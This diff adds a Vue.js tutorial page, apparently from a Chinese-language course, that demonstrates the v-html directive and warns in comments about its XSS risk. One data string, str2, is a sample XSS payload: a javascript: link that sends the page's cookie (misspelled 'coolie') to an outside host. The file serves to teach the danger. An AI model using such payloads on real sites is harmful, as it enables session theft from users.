@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script type="text/javascript" src="../js/vue.js"></script>
+    <title>v-html指令</title>
+</head>
+<body>
+<!-- 
+    我们学过的指令
+        v-bind: 单向绑定解析表达式,可简写为 :xxx
+        v-model: 双向数据绑定
+        v-for: 遍历数组/对象/字符串
+        v-on: 绑定事件监听,可简写为@
+        v-if: 条件渲染
+        v-else: 条件渲染
+        v-show: 条件渲染
+
+    v-html指令:
+        1. 作用： 向指定节点中渲染包含html结构的内容
+        2. 与插值语法的区别：
+            a. v-html会替换掉节点中所有的内容,{{xxx}}则不会
+            b. v-html可以识别html结构
+        3. 严重注意: v-html有安全性问题!!!
+            a. 在网站上动态渲染任意HTML是非常危险的,容易导致XSS攻击.
+            b. 一定要在可信的内容上使用v-html,永不要在用户提交的内容上!
+ -->
+
+
+    <div id="root">
+        <div>{{name}}</div>
+        <div v-text="name">你好,</div>
+        <div v-html="str"></div>
+        <div v-html="str2"></div>
+    </div>
+</body>
+
+<script>
+    new Vue({
+        el: '#root',
+        data(){
+            return {
+                name: '尚硅谷',
+                str: '<h3>你好啊!</h3>',
+                str2: '<a href=javascript:location.href="http://www.baidu.com?"+document.coolie>点我</a>'
+            }
+        },
+        methods: {
+          
+        },
+        computed: {
+           
+        },
+    })
+</script>
+</html>
